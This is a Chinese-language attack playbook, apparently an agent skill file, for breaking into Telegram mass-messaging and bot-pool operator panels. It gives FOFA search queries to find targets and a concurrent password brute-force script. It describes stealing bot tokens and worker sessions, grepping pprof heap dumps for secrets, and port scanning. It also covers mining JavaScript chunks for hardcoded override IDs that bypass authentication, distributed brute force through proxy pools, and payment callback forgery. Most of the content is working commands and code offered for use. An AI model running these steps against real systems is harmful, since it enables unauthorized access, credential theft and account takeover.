---
name: 太白云生·傀池
description: >-
 TG 群发/Bot池运营后台渗透（双子族）：
 ① TG Share V2 Bot池面板（水军号/刷粉/mass-DM infra）：默认 admin 暴破、
 X-Auth-Token 无锁定、bot token/worker session 窃取、Go pprof 旁路侦察、
 SOCKS5 代理池防火墙穿透；
 ② TG营销/群发SaaS（充值点数/账号托管/群发变现）：loginKey 静态永久认证泄露=永久接管、
 admin 单密码全局限速判定、SPA chunk 懒加载挖魔法覆盖ID鉴权绕过。
 
 TG 云控面板（Sticker/Fernet）走 tg-cloud-panel；
 TG 云控双应用/OSS STS 走 tg-cloud-control-pentest。
---

> **太白云生**
> 江山如故人未还，一羽千里破云关。
> 师弟二字恩与债，逆流河底鹤难还。

# TG 群发/Bot池运营后台渗透

**两族共用真源**：`传承/乐土·人情.md`

---

## § A · TG Share V2 Bot 池面板（水军号/刷粉/mass-DM）

### A.1 发现（FOFA）

```
body="Bot池" → 水军号/Bot池面板
title="TG Share"
body="水军号"
title="管理面板" && body="worker"
```

关联情报：面板 HTML 内 `官网` 按钮 / 记账支出（刷粉平台充值/账号底料/魔云腾盒子）→ 溯源运营商其它站点。

### A.2 指纹与认证

- Python 3.14 **aiohttp** 单文件面板（81KB HTML，全量 JS inline）
- 登录页默认预填 `value="admin"` → 暗示真实用户名就是 admin
- `POST /api/login {username, password}` → `{"ok":true,"token":...}`
- 所有 API 需 `X-Auth-Token: <token>`；缺失 → 401 `未授权或登录已过期`
- **无登录锁定**（3万次快速尝试均无封号）→ 直接暴破

```bash
# 并发暴破（8–10 workers，~0.5s/req）
python3 -c "
import requests, concurrent.futures, itertools

BASE = 'https://<目标>'
WORDLIST = ['admin','dupeng','dupi','123456','admin123','password'] + \
 ['<品牌名>','<品牌名>123','<品牌名>2024']

def try_login(pw):
 r = requests.post(f'{BASE}/api/login',
 json={'username':'admin','password':pw}, timeout=5)
 if r.ok and r.json().get('ok'):
 return pw
 return None

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
 for result in ex.map(try_login, WORDLIST):
 if result:
 print(f'[HIT] password={result}')
 break
"
```

### A.3 API 面（登录后全权）

| 端点 | 操作 |
|---|---|
| `/api/bots` | 列/加/批量/验证 bot token |
| `/api/workers` | 列/导入/连接 worker session；`/login` 触发手机验证码登录 |
| `/api/targets` | mass-DM 目标列表（`/all DELETE` 清库） |
| `/api/send/start|stop|status` | 群发控制 |
| `/api/proxies` | 代理池 |
| `/api/restrictions/reset` | 解封"水军号" |

> 拿到 token = 读走所有 worker TG session + bot token → 横向递归走 `tg-bot-webhook-hijack §9`。

### A.4 Go pprof 侦察（旁路进防火墙封锁的运营商盒子）

当主机封锁除 `:19100` 以外所有端口时：

```bash
# pprof 入口
curl -s http://<IP>:19100/debug/pprof/

# goroutine 全栈 → 源码布局 / 包路径 / 二进制名
curl -s "http://<IP>:19100/debug/pprof/goroutine?debug=2"

# cmdline → 确认进程名
curl -s "http://<IP>:19100/debug/pprof/cmdline"

# heap → strings 挖凭据（通常低收益，config 在文件里不在堆上）
curl -s "http://<IP>:19100/debug/pprof/heap?debug=2" | strings | grep -E 'token|pass|key|secret'
```

### A.5 SOCKS5 代理池穿透

```bash
# 并行端口探（24–30 workers，4–5s timeout）
python3 -c "
import socket, concurrent.futures

TARGET = '<IP>'
PORTS = [80,443,8080,8443,3306,6379,9200,27017,5432,2181,8161,19100]

def probe(p):
 try:
 s = socket.create_connection((TARGET, p), timeout=4)
 s.close(); return p
 except: return None

with concurrent.futures.ThreadPoolExecutor(30) as ex:
 open_ports = [p for p in ex.map(probe, PORTS) if p]
print('open:', open_ports)
"
# 即使10个美国代理，特定 host:port 可能全被封 → 只有 FOFA 显示 open 的才真实可达
```

---

## § B · TG 营销/群发 SaaS（充值点数/账号托管变现）

与 §A 区别：变现模型是**卖点数+群发套餐**，无 OSS STS；认证是 loginKey 静态永久 key。

### B.1 指纹

- 登录页 `/signin`，用户输入"密钥"（如 `AYBOT...`）
- `POST /api/login {loginKey}` → loginKey 即是 session（**永不轮换**，明文 body）
- `POST /api/admin/login {password}` → 单密码闩，无用户名；admin 拒 `{"message":"无权限"}`(403)

### B.2 认证速判

| 现象 | 含义 |
|---|---|
| `loginKey` 静态永久 | 泄露 = 永久接管，直接报 P1 |
| admin 单密码 + JWT | admin 独立，loginKey 对 admin 无效 |
| Express `Cannot GET /api/x` | 多后端混合，路径不存在 |
| FastAPI `{detail:[{loc,...}]}` | 参数错误，路径存在 |

### B.3 ⭐ SPA chunk 挖魔法覆盖 ID（鉴权绕过核心）

admin/账号管理/支付均在**懒加载 chunk**，不在 `index.js`：

```bash
# 获取全部 chunk 名（从 index.js 懒加载 map）
curl -sk https://<目标>/ | grep -oE '[a-zA-Z]+-[a-zA-Z0-9_-]+\.js' | sort -u

# 批量下载 chunk
mkdir chunks && for chunk in AdminDashboard TaskMonitor AccountManagement BulkMessaging BatchLogin CloudControl GroupManagement VerifyFailures deposit; do
 url=$(curl -sk https://<目标>/ | grep -oE "${chunk}-[a-zA-Z0-9_-]+\.js" | head -1)
 [ -n "$url" ] && curl -sk "https://<目标>/$url" -o "chunks/$chunk.js"
done

# 提取端点（两种形态）
grep -ohE '"/api/[a-z0-9_/-]*"' chunks/*.js
grep -ohE '\$\{[a-zA-Z]+\}/api/[a-z0-9_/-]*' chunks/*.js

# ★ 挖硬编码魔法覆盖值
grep -oiE '[A-Z_]{6,30}(OVERRIDE|ADMIN|MASTER|SYSTEM|ALL)' chunks/*.js
```

实战：admin 面板硬编码 `user_id=ADMIN_OVERRIDE` 直调 `GET /api/get_logs` → **无需任何认证**，全站流水泄露。

### B.4 全局限速 vs IP 限速判定（admin 爆破前必做）

```bash
# 用新代理 IP 打一次错误密码
curl -s -X POST https://<目标>/api/admin/login \
 -d '{"password":"wrongpassword"}' -H 'Content-Type: application/json'
# "密码错误" → 按IP限速 → 可代理池分布式暴破
# "登录尝试过于频繁，请60分钟后再试" → 全局限速 → 爆破作废，立即换思路
```

### B.5 资金路径

- 充值闭环：`POST /api/orders/create {loginKey,packageName,amount}` → orderId + 收款地址
- 确认：`POST /api/recharge-balance {...}` **校验链上到账**（"未检测到转账"）→ 无法客户端伪造
- 若存在 `notify/callback` 且签名弱 → 交 `pay_matrix` 做回调伪造

---

## 通用工具

```bash
# tg-cloud-panel-probe（两族均可用）
python3 炼蛊房/tg_cloud_panel_probe.py --help
```

## 真源

- 手法：`传承/乐土·人情.md`
- 工具：`python3 炼蛊房/tg_cloud_panel_probe.py --help`
- 横向递归：Bot token / session 命中后走 `tg-bot-webhook-hijack §9`
